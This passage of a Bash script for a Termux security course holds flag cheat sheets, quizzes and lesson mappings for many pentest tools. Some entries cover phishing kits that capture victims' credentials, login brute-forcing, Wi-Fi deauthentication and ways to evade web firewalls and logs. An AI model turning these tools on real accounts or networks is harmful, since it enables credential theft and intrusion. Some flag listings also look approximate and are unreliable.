    ["Amass"]="1. enum -d <domain>: Enumerate subdomains|2. intel -whois: Reverse WHOIS lookup|3. viz -d3: Generate graph visualization|4. -active: Enable active scanning|5. -p 80,443: Port list|6. -src: Show data sources|7. -ip: Show IP addresses|8. -asn: Show ASN info|9. -dir: Custom output directory|10. -o: Save to file"
    ["Gobuster"]="1. dir: Directory/File mode|2. dns: DNS subdomain mode|3. -u <url>: Target URL|4. -w <list>: Wordlist path|5. -x: File extensions|6. -t: Thread count|7. -k: Skip TLS verification|8. vhost: Virtual host mode|9. -s: Positive status codes|10. -o: Output file"
    ["Medusa"]="1. -h: Target host|2. -u: Username|3. -U: User list file|4. -p: Password|5. -P: Password list file|6. -M: Protocol module|7. -n: Non-default port|8. -v 4: Set verbosity|9. -t 10: Task count|10. -f: Stop on first success"
    ["APKTool"]="1. d <file>: Decode APK|2. b <dir>: Build APK|3. -o <file>: Output path|4. -r: Do not decode resources|5. -s: Do not decode sources|6. empty-framework-dir: Clear framework|7. -f: Force delete destination|8. -v: Verbose mode|9. --version: Check version|10. if <file>: Install framework"
    ["ZPhisher"]="1. bash zphisher.sh: Start tool|2. Localhost: Test locally|3. Cloudflare: Tunneling|4. Ngrok: External link|5. 01: Facebook templates|6. 02: Google templates|7. 03: LinkedIn templates|8. 33: Custom site|9. View Saved: See captured info|10. IPs: View victim IP"
    ["Ghidra"]="1. decompile: View C output|2. xrefs: View cross references|3. strings: Extract text|4. search: Find byte patterns|5. script: Run headless scripts|6. function: Analyze flow|7. export: Save binary|8. data: Analyze types|9. graph: Flow graphs|10. analyze: Run auto analysis"
    ["ExifTool"]="1. <file>: View all metadata|2. -all=: Strip all metadata|3. -GPSLatitude: View location|4. -Model: View camera model|5. -csv: Output to CSV|6. -j: Output to JSON|7. -overwrite_original: Save in place|8. -r: Recursive processing|9. -ext: Filter by extension|10. -artist='me': Set metadata"
    ["Radare2"]="1. r2 <file>: Open binary|2. aaa: Analyze all|3. afl: List functions|4. pdf @main: Disassemble main|5. vv: Visual mode|6. i: General file info|7. s <addr>: Seek to address|8. px: Hex dump|9. pd 20: Disassemble 20 lines|10. q: Quit"
    ["Binwalk"]="1. <file>: Scan for signatures|2. -e: Extract known file types|3. -M: Matryoshka (recursive) scan|4. -D: Extract specific signatures|5. -I: Ignore specific signatures|6. -v: Verbose output|7. -A: Scan for OpCodes|8. -E: Entropy analysis|9. -W: Hex dump/diff|10. --dd='type:ext:cmd': Custom extract"
    ["ATSCAN"]="1. -t <target>: Target URL|2. -d <dork>: Dork query|3. -e <exploit>: Exploit type|4. -s: SQL injection scan|5. -x: XSS scan|6. -p: Path traversal scan|7. -o: Output to file|8. -v: Verbose mode|9. --proxy: Use proxy|10. --user-agent: Custom user agent"
    ["bing-ip2hosts"]="1. <IP>: Discover hosts for IP|2. -o <file>: Output to file|3. -v: Verbose mode|4. -s: Silent mode|5. -h: Show help|6. -c: Count hosts|7. -d: Domain filter|8. -p: Proxy support|9. -t: Timeout|10. -u: Update tool"
    ["CloudEnum"]="1. --aws: Enumerate AWS resources|2. --azure: Enumerate Azure resources|3. --gcp: Enumerate GCP resources|4. --key <key>: API key|5. --secret <secret>: API secret|6. --region <region>: Cloud region|7. --output <file>: Save results|8. --enum-all: Enumerate all services|9. --verbose: Detailed output|10. --no-cache: Disable caching"
    ["CMSeeK"]="1. -u <url>: Target URL|2. --batch: Non-interactive mode|3. --skip-update: Skip update check|4. --random-agent: Random user agent|5. --proxy: Use proxy|6. --google-dork: Use Google dorks|7. --follow-redirect: Follow redirects|8. --skip-waf: Skip WAF detection|9. --output <dir>: Output directory|10. --verbose: Detailed output"
    ["CMSmap"]="1. -t <target>: Target URL|2. -f <cms>: Force CMS type|3. -a: Aggressive scan|4. -F: Full scan|5. -U <user>: Username|6. -P <pass>: Password|7. -o <file>: Output to file|8. --no-color: Disable colors|9. --proxy: Use proxy|10. --verbose: Detailed output"
    ["Crips"]="1. -t <target>: Target IP/Domain|2. -p: Port scan|3. -w: Whois lookup|4. -d: DNS lookup|5. -g: GeoIP lookup|6. -s: Subdomain scan|7. -e: Email extraction|8. -o: Output to file|9. -v: Verbose mode|10. -h: Show help"
    ["dmitry"]="1. -i <host>: Perform whois lookup|2. -w: Perform whois lookup|3. -n: Retrieve Netcraft.com info|4. -s: Perform subdomain search|5. -e: Perform email address search|6. -p: Perform TCP port scan|7. -f: Perform a 'fuzzy' search|8. -o <file>: Output to file|9. -b: Read from stdin|10. -h: Show help"
    ["dnsrecon"]="1. -d <domain>: Target domain|2. -a: Perform all checks|3. -s: Perform zone transfer|4. -t <type>: Specify record type|5. -n <server>: Use specific DNS server|6. -D <wordlist>: Brute-force subdomains|7. -f: Filter out private IPs|8. -x <xml>: XML output|9. -j <json>: JSON output|10. -v: Verbose output"
    ["Wapiti"]="1. -u <url>: Target URL|2. -m <module>: Specify scan module|3. -o <dir>: Output directory|4. -f <format>: Output format (html, xml)|5. -s <scope>: Scan scope|6. -p <proxy>: Use proxy|7. -c <cookie>: Use cookie|8. -t <timeout>: Set timeout|9. -v: Verbose mode|10. --flush-session: Clear session"
    ["Dirb"]="1. <url>: Target URL|2. <wordlist>: Custom wordlist|3. -X <ext>: File extensions|4. -z <sec>: Delay between requests|5. -r: Don't recurse|6. -L: Don't follow redirects|7. -o <file>: Output to file|8. -v: Verbose mode|9. -H <header>: Custom header|10. -a <agent>: User agent"
    ["Fimap"]="1. -u <url>: Target URL|2. -H <header>: Custom header|3. -C <cookie>: Custom cookie|4. -b: Blind LFI scan|5. -e: Exploit LFI|6. -s: Scan for RFI|7. -w <wordlist>: Custom wordlist|8. -o <file>: Output to file|9. -v: Verbose mode|10. -h: Show help"
    ["Commix"]="1. -u <url>: Target URL|2. --data <data>: POST data|3. --cookie <cookie>: Cookie string|4. --level <level>: Test level|5. --technique <tech>: Injection technique|6. --os-shell: Get OS shell|7. --file-read <file>: Read file|8. --file-write <file>: Write file|9. --batch: Non-interactive|10. --proxy: Use proxy"
    ["Zmap"]="1. -p <port>: Target port|2. -o <file>: Output to file|3. -B <bps>: Bandwidth limit|4. -n <count>: Number of probes|5. -i <interface>: Network interface|6. -w <file>: Blacklist file|7. -r <rate>: Packet rate|8. --output-fields: Output fields|9. --probe-args: Probe arguments|10. --shards: Shard scan"
    ["Ettercap"]="1. -G: Start GUI|2. -T: Text mode|3. -M <type>: MITM attack (arp, dhcp)|4. -i <interface>: Network interface|5. -P <plugin>: Load plugin|6. -F <file>: Load filter file|7. -r <file>: Read from pcap|8. -w <file>: Write to pcap|9. -L <file>: Log packets|10. -S: Sniff SSL"
    ["fping"]="1. -g <start> <end>: Generate target list|2. -a: Show alive hosts|3. -d: Show hostname|4. -e: Show elapsed time|5. -i <interval>: Ping interval|6. -l: Loop ping|7. -p <period>: Ping period|8. -q: Quiet output|9. -t <timeout>: Timeout|10. -c <count>: Ping count"
    ["ARPscan"]="1. -l: Scan local network|2. -I <interface>: Network interface|3. -r <count>: Retries|4. -t <timeout>: Timeout|5. -q: Quiet output|6. -v: Verbose output|7. --file <file>: Read targets from file|8. --plain: Plain output|9. --mac-file <file>: MAC vendor file|10. --random: Randomize target order"
    ["RainbowCrack"]="1. -r <table>: Use rainbow table|2. -h <hash>: Crack specific hash|3. -l: List available tables|4. -d <dir>: Rainbow table directory|5. -t <threads>: Number of threads|6. -f <file>: Crack hashes from file|7. -c <charset>: Character set|8. -s <start>: Start position|9. -e <end>: End position|10. -v: Verbose output"
    ["THC-pptp-bruter"]="1. -u <user>: Username|2. -U <file>: User list|3. -p <pass>: Password|4. -P <file>: Password list|5. -h <host>: Target host|6. -t <threads>: Number of threads|7. -v: Verbose mode|8. -w <time>: Wait time|9. -c: Check for valid users|10. -f: Stop on first success"
    ["Patator"]="1. ssh_login: SSH brute-force|2. ftp_login: FTP brute-force|3. http_fuzz: HTTP fuzzing|4. -u <user>: Username|5. -x <pass>: Password|6. -e <file>: Exploit file|7. -t <threads>: Number of threads|8. -s <host>: Target host|9. -p <port>: Target port|10. --scan: Scan for services"
    ["Brutespray"]="1. --file <file>: Nmap XML file|2. --host <host>: Target host|3. --user <user>: Username|4. --pass <pass>: Password|5. --threads <threads>: Threads|6. --services <svc>: Services to attack|7. --timeout <time>: Timeout|8. --verbose: Verbose output|9. --dry-run: Simulate attack|10. --output <dir>: Output directory"
    ["Qark"]="1. --apk <file>: Analyze APK|2. --json: JSON output|3. --report-html: HTML report|4. --report-xml: XML report|5. --ignore-certs: Ignore SSL certs|6. --ignore-warnings: Ignore warnings|7. --no-external-tools: Skip external tools|8. --verbose: Verbose output|9. --rules <dir>: Custom rules directory|10. --output <dir>: Output directory"
    ["Objection"]="1. -g <package>: Target package|2. explore: Start interactive session|3. android sslpinning disable: Disable SSL pinning|4. android hooking list classes: List classes|5. android hooking search classes <query>: Search classes|6. android hooking watch class <class>: Watch class|7. android hooking watch method <method>: Watch method|8. android heap search instances <class>: Search heap|9. android activities list: List activities|10. android intents list: List intents"
    ["jadx"]="1. <file.apk>: Decompile APK|2. -d <dir>: Output directory|3. --show-bad-code: Show bad code|4. --no-res: Skip resources|5. --no-src: Skip sources|6. --cfg: Export control flow graph|7. --log-level <level>: Log level|8. --output-format <format>: Output format|9. --threads <threads>: Number of threads|10. --verbose: Verbose output"
    ["SocialFish"]="1. python3 SocialFish.py: Start tool|2. 1: Facebook template|3. 2: Instagram template|4. 3: Google template|5. 4: Twitter template|6. 5: Custom template|7. 0: Exit|8. ngrok: Tunneling option|9. serveo: Tunneling option|10. localhost: Local access"
    ["HiddenEye"]="1. python3 HiddenEye.py: Start tool|2. 1: Facebook template|3. 2: Google template|4. 3: Instagram template|5. 4: Twitter template|6. 5: Custom template|7. ngrok: Tunneling option|8. serveo: Tunneling option|9. localhost: Local access|10. 0: Exit"
    ["BlackEye"]="1. bash blackeye.sh: Start tool|2. 1: Facebook template|3. 2: Google template|4. 3: Instagram template|5. 4: Twitter template|6. 5: Custom template|7. ngrok: Tunneling option|8. serveo: Tunneling option|9. localhost: Local access|10. 0: Exit"
    ["ShellPhish"]="1. bash shellphish.sh: Start tool|2. 1: Facebook template|3. 2: Google template|4. 3: Instagram template|5. 4: Twitter template|6. 5: Custom template|7. ngrok: Tunneling option|8. serveo: Tunneling option|9. localhost: Local access|10. 0: Exit"
    ["Weeman"]="1. python weeman.py: Start tool|2. set url <url>: Target URL|3. set action_url <url>: Action URL|4. set port <port>: Listen port|5. set html <file>: Custom HTML|6. set ssl <true/false>: Enable SSL|7. run: Start server|8. show: Show settings|9. help: Show help|10. exit: Exit tool"
    ["YARA"]="1. -s <string>: Search for string|2. -x <hex>: Search for hex string|3. -f: Fast mode|4. -n: Don't show rule name|5. -r: Recursive scan|6. -m: Print metadata|7. -p <threads>: Number of threads|8. -d <var>: Define external variable|9. -w: Disable warnings|10. <rules.yar> <target>: Scan with rules"
    ["Strings"]="1. <file>: Print strings|2. -a: Scan entire file|3. -f: Print filename before string|4. -n <len>: Min string length|5. -t <format>: Radix of offset|6. -e <encoding>: Character encoding|7. -o: Print offset|8. -d: Print data section strings|9. -s: Print all sections strings|10. -v: Print version"
    ["Foremost"]="1. -t <type>: Specify file types|2. -i <file>: Input file|3. -o <dir>: Output directory|4. -v: Verbose mode|5. -q: Quick mode|6. -w: Write audit file|7. -a: Write all headers|8. -b <size>: Block size|9. -k <size>: Chunk size|10. -s <skip>: Skip bytes"
    ["LIEF"]="1. parse <file>: Parse binary|2. json <file>: JSON output|3. dump <file>: Dump info|4. extract <file>: Extract sections|5. patch <file>: Patch binary|6. rebuild <file>: Rebuild binary|7. --format <format>: Output format|8. --raw: Raw output|9. --verbose: Verbose output|10. --help: Show help"
)

# Quizzes for individual tools
declare -A TOOL_QUIZZES=(
    ["Nmap"]="Which flag is used for service version detection?|-sS|-sV|-O|B"
    ["Metasploit"]="Which command starts the Metasploit console?|msfconsole|msfstart|metasploit|A"
    ["Hydra"]="Hydra is primarily used for which type of attack?|SQL Injection|Brute-force|Packet sniffing|B"
    ["Sqlmap"]="What is the main purpose of Sqlmap?|Port scanning|SQL Injection|WiFi auditing|B"
    ["Aircrack-ng"]="Aircrack-ng is used for auditing which type of networks?|Ethernet|WiFi|Bluetooth|B"
    ["John the Ripper"]="John the Ripper is used for cracking what?|Hashes/Passwords|Web forms|SSH keys|A"
    ["Nikto"]="What does Nikto scan for?|WiFi passwords|Web server vulnerabilities|CPU usage|B"
    ["Wifite"]="Wifite is an automated tool for what?|WiFi attacks|Python coding|Disk cleanup|A"
    ["Termux API"]="Which package allows access to Android hardware features?|termux-tools|termux-api|termux-gui|B"
    ["Fish Shell"]="What is a standout feature of the Fish shell?|Complex syntax|Autosuggestions|No color|B"
    ["Htop"]="Htop is an interactive monitor for what?|Disk usage|Processes & System|Network speed|B"
    ["FFmpeg"]="FFmpeg is a solution for processing what?|Text files|Audio & Video|Binary code|B"
    ["Micro Editor"]="Micro is designed to be intuitive using which shortcuts?|Vim keybinds|Common Ctrl-S/C/V|Emacs commands|B"
    ["Zsh Shell"]="Which framework is commonly used to manage Zsh plugins?|Oh My Zsh|Bash-it|Zsh-Master|A"
    ["Neofetch"]="What does Neofetch display?|System info & ASCII logo|Network logs|Open ports|A"
    ["Bat"]="Bat is a modern alternative to which command?|ls|cat|grep|B"
    ["Eza"]="Eza is a feature-rich replacement for which command?|cd|ls|mv|B"
    ["Tldr"]="What does Tldr provide?|Full man pages|Simplified examples|Source code|B"
    ["Dust"]="What does the Dust tool help you visualize?|Disk usage|CPU heat|Network packets|A"
    ["Aria2"]="Aria2 is a lightweight utility for what?|File editing|Multi-protocol downloads|Streaming|B"
    ["Rclone"]="Rclone allows you to sync files with what?|Cloud storage|Local printers|External monitors|A"
    ["LazyGit"]="LazyGit provides a TUI for which tool?|Svn|Git|Docker|B"
    ["Ranger"]="Ranger is a file manager that uses keybinds from?|Nano|Vim|Emacs|B"
    ["Caddy"]="Caddy is best known for providing what automatically?|Backups|HTTPS (SSL)|Updates|B"
    ["Gitea"]="What is Gitea?|A web browser|Self-hosted Git service|A shell|B"
    ["Amass"]="Amass is primarily used for which task?|SQL Injection|Attack Surface Mapping|Password Cracking|B"
    ["Gobuster"]="Gobuster is used to brute-force what?|Directories & DNS|WPA2 Handshakes|Kernel modules|A"
    ["Medusa"]="How does Medusa differ from Hydra?|It is parallelized|It only does FTP|It is CLI based|A"
    ["APKTool"]="What is the primary function of APKTool?|Reverse engineering APKs|Rooting Android|Installing apps|A"
    ["ZPhisher"]="ZPhisher is used to simulate which type of attack?|Phishing|DDoS|Ransomware|A"
    ["Ghidra"]="Which agency developed Ghidra?|NASA|NSA|FBI|B"
    ["ExifTool"]="ExifTool is used to manipulate what?|File metadata|System logs|Network packets|A"
    ["Binwalk"]="What is the primary use of Binwalk?|Monitoring traffic|Extracting files from binaries|Disk formatting|B"
    ["ATSCAN"]="ATSCAN is primarily used for what?|Dork search & exploit scanning|Network mapping|Password cracking|A"
    ["bing-ip2hosts"]="What does bing-ip2hosts help discover?|Sites by IP address|DNS records|Email addresses|A"
    ["CloudEnum"]="CloudEnum is used for enumerating resources in which environment?|Local network|Cloud platforms|Mobile devices|B"
    ["CMSeeK"]="CMSeeK specializes in detecting and exploiting what?|Content Management Systems|Cloud services|Command-line interfaces|A"
    ["CMSmap"]="CMSmap is an automated tool for detecting flaws in what?|Operating systems|Content Management Systems|Network protocols|B"
    ["Crips"]="Crips is an info gathering tool for what?|IP/DNS information|Social media profiles|Wireless networks|A"
    ["dmitry"]="What does dmitry stand for?|Deepmagic Information Gathering Tool|Digital Malware Identification Tool|Dynamic Memory Inspection Tool|A"
    ["dnsrecon"]="dnsrecon is primarily used for what?|DNS enumeration|DNS spoofing|DNS caching|A"
    ["Wapiti"]="Wapiti is a web vulnerability scanner that performs what kind of testing?|Static analysis|Dynamic analysis|Manual review|B"
    ["Dirb"]="Dirb is a web content scanner that performs what?|Directory brute-forcing|SQL injection|XSS detection|A"
    ["Fimap"]="Fimap is used to find and exploit which vulnerabilities?|SQL Injection|Local/Remote File Inclusion|Cross-Site Scripting|B"
    ["Commix"]="Commix is an automated tool for exploiting which vulnerability?|SQL Injection|Command Injection|Buffer Overflow|B"
    ["Zmap"]="Zmap is known for what characteristic?|Slow, deep scans|Internet-wide scanning at high speed|Targeted host scanning|B"
    ["Ettercap"]="Ettercap is primarily used for what type of attacks?|Man-in-the-Middle (MITM)|Denial of Service (DoS)|Brute-force|A"
    ["fping"]="fping is used for what purpose?|Fast pinging of multiple hosts|File integrity checking|Fingerprinting operating systems|A"
    ["ARPscan"]="ARPscan is used for what?|ARP cache poisoning|ARP discovery on local networks|ARP protocol analysis|B"
    ["RainbowCrack"]="RainbowCrack uses what technique for password cracking?|Brute-force|Dictionary attack|Rainbow tables|C"
    ["THC-pptp-bruter"]="THC-pptp-bruter targets which protocol?|SSH|FTP|PPTP|C"
    ["Patator"]="Patator is described as what kind of brute-forcer?|Single-purpose|Multi-purpose|GPU-based|B"
    ["Brutespray"]="Brutespray automates brute-force attacks using output from which tool?|Nmap|Metasploit|Wireshark|A"
    ["Qark"]="Qark is used for what purpose in Android security?|App vulnerability scanning|Runtime exploration|APK decompilation|A"
    ["Objection"]="Objection is a runtime mobile exploration toolkit that uses which framework?|Frida|Xposed|Magisk|A"
    ["jadx"]="jadx is primarily used for what?|APK decompilation|Android app development|Mobile forensics|A"
    ["SocialFish"]="SocialFish is a toolkit for what type of attacks?|Phishing|DDoS|Malware analysis|A"
    ["HiddenEye"]="HiddenEye is a framework for what?|Phishing|Network scanning|Password cracking|A"
    ["BlackEye"]="BlackEye is used to generate what?|Phishing pages|Malware samples|Network traffic|A"
    ["ShellPhish"]="ShellPhish is a toolkit for what?|Phishing|Shell scripting|File recovery|A"
    ["Weeman"]="Weeman acts as what kind of server for phishing?|FTP|HTTP|DNS|B"
    ["YARA"]="YARA is used for what purpose?|Malware signature matching|File recovery|Binary patching|A"
    ["Strings"]="The 'strings' command is used to extract what from binary files?|Executable code|Human-readable text|Metadata|B"
    ["Foremost"]="Foremost is a tool for what?|File recovery|Memory forensics|Network analysis|A"
    ["LIEF"]="LIEF is a library for parsing and modifying what kind of files?|Text files|Executable formats (PE/ELF)|Image files|B"
)

# New: Detailed flag explanations and usage context
declare -A FLAG_EXPLANATIONS=(
    ["Nmap"]="-sS: Stealth Scan. Use for fast, hard-to-detect port discovery.\n-sV: Version Scan. Use when you need to know exactly what software is on a port.\n-O: OS Detection. Use to identify the host operating system.\n-Pn: Skip Ping. Use if the target blocks ICMP/ping requests.\n-A: Aggressive. Combines OS, version, and script scanning (Noisy!).\n--script vuln: Automated vulnerability check for known CVEs."
    ["Metasploit"]="msfconsole: The main interface.\nsearch: Find specific exploits for your target.\nuse: Select a module to configure.\nset RHOSTS: Define the remote target IP.\nexploit/run: Execute the selected module.\nsessions -i: Interact with a backgrounded connection.\nmsfvenom: Standalone payload generator (creates .apk, .exe, etc.)."
    ["Hydra"]="-l/-L: Set a single user or a list of users.\n-p/-P: Set a single password or a wordlist (rockyou.txt).\n-t: Parallel tasks. Increase to speed up, decrease to avoid crashing the server.\n-s: Custom port. Use if the service isn't on the default port.\n-f: Exit on success. Saves time once you have a hit.\n-vV: Verbose. See every login attempt in real-time."
    ["Sqlmap"]="-u: Target URL with parameters.\n--dbs: List all databases.\n--tables: List tables in a database.\n--dump: Extract data from a table.\n--batch: Automate choices (yes to everything).\n--random-agent: Spoof headers to bypass simple WAFs.\n--os-shell: Attempt to gain a remote terminal on the DB server."
    ["Aircrack-ng"]="airmon-ng: Put your card in monitor mode.\nairodump-ng: Sniff packets and find BSSIDs.\naireplay-ng: Inject packets (Deauth attacks).\naircrack-ng: The actual cracker. Use wordlists to find the key.\n-b: Target a specific MAC address.\n-w: Path to your dictionary file."
    ["John the Ripper"]="--wordlist: Define the dictionary to use.\n--format: Tell John what type of hash you have (MD5, SHA1, etc.).\n--show: View already cracked passwords.\n--incremental: Pure brute force (no wordlist).\nssh2john/zip2john: Helper scripts to convert files into crackable hashes."
    ["Nikto"]="-h: Host to scan.\n-p: Port to scan.\n-ssl: Force SSL connection.\n-C: Check specific vulnerability ID.\n-Tuning: Filter tests (1: xss, 2: sql, 3: file upload).\n-evasion: Techniques to hide the scan from security logs."
    ["Wifite"]="--kill: Kills conflicting processes.\n--pixie: WPS Pixie-Dust attack (Instant cracks on vulnerable routers).\n--wps: Target ONLY WPS-enabled networks.\n--pmkid: Modern attack that doesn't require a connected client.\n--no-deauth: Stealthy handshake capture without kicking users off."
    ["Termux API"]="termux-vibrate: Pulse the phone vibrator.\ntermux-tts-speak: Convert text to speech.\ntermux-notification: Send a native Android alert.\ntermux-location: Get GPS coordinates.\ntermux-battery-status: Check juice level and health.\ntermux-clipboard-get/set: Interact with the system clipboard."
    ["FFmpeg"]="-i: Input file.\n-vn: Remove video (extract audio).\n-an: Remove audio (extract video).\n-codec:v: Set video compression (libx264).\n-ss: Start time (seek).\n-t: Duration. Use with -ss to cut specific clips."
    ["ExifTool"]="<file>: View all metadata.\n-all=: Strip all info (Privacy).\n-GPSLatitude: Extract GPS location.\n-overwrite_original: Save changes in place.\n-csv: Output results to a spreadsheet."
    ["Binwalk"]="<file>: Scan for hidden headers.\n-e: Extract everything automatically.\n-M: Recursive scan (find files inside files).\n-A: Search for executable machine code instructions.\n-E: Entropy analysis to find compressed or encrypted data."
    ["Amass"]="enum -d: Discover subdomains for a root domain.\n-active: Use active DNS/port scanning to verify targets.\n-ip: Resolve names to IP addresses.\n-asn: Find network ranges belonging to an organization.\nviz: Generate a visual graph of the attack surface."
    ["Gobuster"]="dir: Directory/file mode.\ndns: Subdomain mode.\n-w: Path to wordlist.\n-x: File extensions to append (php, txt, bak).\n-t: Threads. Higher is faster but noisier.\n-k: Ignore certificate errors (Self-signed certs)."
    ["Medusa"]="-h: Target host.\n-u/-U: Single user or user list.\n-p/-P: Single password or password list.\n-M: Protocol module (ssh, ftp, http).\n-f: Stop immediately after first success."
    ["APKTool"]="d: Decompile an APK into resources and smali code.\nb: Build a new APK from a directory.\n-r: Skip resource decoding (faster, code only).\n-s: Skip source decoding (resource editing only)."
    ["ZPhisher"]="Cloudflare/Ngrok: Use these to get a public link.\nLocalhost: Use for testing locally.\nView Saved: Check this to see captured credentials."
    ["Ghidra"]="decompile: Convert assembly to C.\nxrefs: Find where a function or variable is used.\nstrings: Extract text embedded in the program binary.\nanalyze: Run the automated analysis engine."
    ["Radare2"]="aaa: Analyze all parts of the binary.\nafl: List all functions discovered.\npdf: Print disassembly of a function.\ns: Seek to a memory address.\npx: View the hex dump of a region.\nw: Write/Patch new data into the file."
    ["Bat"]="-p: Plain cat mode (no line numbers).\n-l: Force syntax highlighting for a specific language.\n--diff: View changes relative to a Git repo."
    ["Eza"]="-l: Detailed list.\n-T: Tree view of directories.\n--icons: Show file icons.\n--git: Display the Git status for every file."
)

# Map tools to the lesson number that covers them
declare -A TOOL_TO_LESSON=(
    ["Nmap"]=8
    ["Metasploit"]=10
    ["Hydra"]=10
    ["Sqlmap"]=10
    ["Aircrack-ng"]=10
    ["John the Ripper"]=10
    ["Nikto"]=10
    ["Wifite"]=10
    ["Termux API"]=9
    ["Micro Editor"]=3
    ["Zsh Shell"]=15
    ["Fish Shell"]=15
    ["Neofetch"]=15
    ["Bat"]=19
    ["Eza"]=19
    ["Tldr"]=19
    ["Dust"]=19
    ["Aria2"]=18
    ["Rclone"]=18
    ["LazyGit"]=6
    ["Ranger"]=14
    ["Caddy"]=20
    ["Gitea"]=20
    ["Amass"]=21
    ["bbot"]=21
    ["XSStrike"]=22
    ["Gobuster"]=22
    ["Masscan"]=23
    ["Hping3"]=23
    ["Medusa"]=24
    ["CeWL"]=24
    ["APKTool"]=25
    ["Frida"]=25
    ["ZPhisher"]=26
    ["SET"]=26
    ["Volatility"]=27
    ["Ghidra"]=27
    ["Radare2"]=27
    ["ExifTool"]=27
    ["Binwalk"]=27
    ["ClamAV"]=27
    ["WhatWeb"]=22
    ["Sublist3r"]=22
    ["ATSCAN"]=28
    ["bing-ip2hosts"]=28
    ["CloudEnum"]=28
    ["CMSeeK"]=28
    ["CMSmap"]=28
    ["Crips"]=28
    ["dmitry"]=28
    ["dnsrecon"]=28
    ["Wapiti"]=29
    ["Dirb"]=29
    ["Fimap"]=29
    ["Commix"]=29
    ["Zmap"]=30
    ["Ettercap"]=30
    ["fping"]=30
    ["ARPscan"]=30
    ["RainbowCrack"]=31
    ["THC-pptp-bruter"]=31
    ["Patator"]=31
    ["Brutespray"]=31
    ["Qark"]=32
    ["Objection"]=32
    ["jadx"]=32
    ["SocialFish"]=33
    ["HiddenEye"]=33
    ["BlackEye"]=33
    ["ShellPhish"]=33
    ["Weeman"]=33
    ["YARA"]=34
    ["Strings"]=34
    ["Foremost"]=34
    ["LIEF"]=34
)

# New: Automated exercise offerer
offer_tool_exercises() {
    local lesson_num=$1
    local tools_found=()
    
    # Find tools mapped to this lesson
    for tool in "${!TOOL_TO_LESSON[@]}"; do
        if [[ "${TOOL_TO_LESSON[$tool]}" == "$lesson_num" ]]; then
            tools_found+=("$tool")
        fi
    done

    if [ ${#tools_found[@]} -gt 0 ]; then
        echo ""
        line
        echo -e "  ${MAGENTA}🛠️  HANDS-ON TOOL EXERCISES${NC}"
        echo -e "  ${WHITE}The following tools are covered in this lesson. Practice now?${NC}"
        for t in "${tools_found[@]}"; do
            echo -ne "  ${YELLOW}Start exercise for $t? (y/n): ${NC}"
            read -n 1 t_conf
            echo ""
            [[ "$t_conf" =~ ^[Yy]$ ]] && tool_practice_session "$t"
        done
    fi
}

# Searchable lesson titles
declare -A LESSON_TITLES=(
    [1]="What is Termux?"
    [2]="Initial Setup"
    [3]="Text Editors"
    [4]="Python"
    [5]="Node.js"
    [6]="Git & GitHub"
    [7]="SSH & Tmux"
    [8]="Network Tools"
    [9]="Termux:API"
    [10]="Sec & PenTools"
    [11]="Automation"
    [12]="Databases"
    [13]="Linux Distros"
    [14]="File Processing"
    [15]="Customization"
    [16]="Project Ideas"
    [17]="Reference Card"
    [18]="Cloud & Sync"
    [19]="Modern CLI Tools"
    [20]="Self-Hosting"
    [21]="OSINT & Recon"
    [22]="Web App Testing"
    [23]="Adv Network Scan"
    [24]="Password Attacks"
    [25]="Mobile Sec"
    [26]="Social Eng"
    [27]="Forensics & RE"
    [28]="OSINT & Recon (Advanced)"
    [29]="Web App Testing (Advanced)"
    [30]="Network Scanning (Advanced)"
    [31]="Password Attacks (Advanced)"
    [32]="Android/Mobile Tools"
    [33]="Social Engineering & Phishing"
    [34]="Forensics & Malware Analysis"
)

# Progress tracking associative array (stores index -> completion timestamp)
declare -A DONE_LESSONS
declare -A ACHIEVEMENTS
declare -A FAILED_TOOLS
declare -A FAILED_SCENARIOS
CHALLENGES_COMPLETED=0
USER_NAME="Recruit"
PROGRESS_FILE="$HOME/.termux_class_progress"
TTS_PITCH=1.0
TTS_RATE=1.0
TTS_FULL_NARRATION=0

# Wrapper to inject user-defined pitch and rate into all narration calls
termux-tts-speak() {
    command termux-tts-speak -p "$TTS_PITCH" -r "$TTS_RATE" "$@"
}

# Save progress to a hidden file
save_progress() {
    : > "$PROGRESS_FILE"
    echo "USER_NAME|$USER_NAME" >> "$PROGRESS_FILE"
    echo "CHALLENGES|$CHALLENGES_COMPLETED" >> "$PROGRESS_FILE"
    echo "TTS_PITCH|$TTS_PITCH" >> "$PROGRESS_FILE"
    echo "TTS_RATE|$TTS_RATE" >> "$PROGRESS_FILE"
    echo "TTS_FULL_NARRATION|$TTS_FULL_NARRATION" >> "$PROGRESS_FILE"
    for idx in "${!DONE_LESSONS[@]}"; do
        echo "$idx|${DONE_LESSONS[$idx]}" >> "$PROGRESS_FILE"
    done
    for scn in "${!FAILED_SCENARIOS[@]}"; do
        echo "FAIL_SCN:$scn|${FAILED_SCENARIOS[$scn]}" >> "$PROGRESS_FILE"
    done
    for tool in "${!FAILED_TOOLS[@]}"; do
        echo "FAIL:$tool|${FAILED_TOOLS[$tool]}" >> "$PROGRESS_FILE"
    done
    # Backup to storage if available
    cp "$PROGRESS_FILE" "$HOME/storage/downloads/termux_class_backup.txt" 2>/dev/null
}

# Load progress from the hidden file
load_progress() {
    if [[ -f "$PROGRESS_FILE" ]]; then
        while IFS='|' read -r idx timestamp; do
            if [[ "$idx" == "USER_NAME" ]]; then
                USER_NAME="$timestamp"
            elif [[ "$idx" == "CHALLENGES" ]]; then
                CHALLENGES_COMPLETED="$timestamp"
            elif [[ "$idx" == "TTS_PITCH" ]]; then
                TTS_PITCH="$timestamp"
            elif [[ "$idx" == "TTS_RATE" ]]; then
                TTS_RATE="$timestamp"
            elif [[ "$idx" == "TTS_FULL_NARRATION" ]]; then
                TTS_FULL_NARRATION="$timestamp"
            elif [[ "$idx" == FAIL_SCN:* ]]; then
                local sname="${idx#FAIL_SCN:}"
                FAILED_SCENARIOS["$sname"]="$timestamp"
            elif [[ "$idx" == FAIL:* ]]; then
                local tname="${idx#FAIL:}"
                FAILED_TOOLS["$tname"]="$timestamp"
            elif [[ -n "$idx" ]]; then
                DONE_LESSONS["$idx"]="$timestamp"
            fi
        done < "$PROGRESS_FILE"
    fi
}

# Helper to get terminal width
get_width() { tput cols; }

# Helper to center text
center() {
    local text="$1"
    local width=$(get_width)
    # Strip ANSI color codes to calculate real length
    local clean_text=$(echo -e "$text" | sed 's/\x1b\[[0-9;]*m//g')
    local length=${#clean_text}
    local padding=$(( (width - length) / 2 ))
    if (( padding > 0 )); then
        printf "%${padding}s" " "
    fi
    echo -e "$text"
}

# Separator line
line() {
    local width=$(get_width)
    echo -e "${CYAN}$(printf '┄%.0s' $(seq 1 $width))${NC}"
}

thick_line() {
    local width=$(get_width)
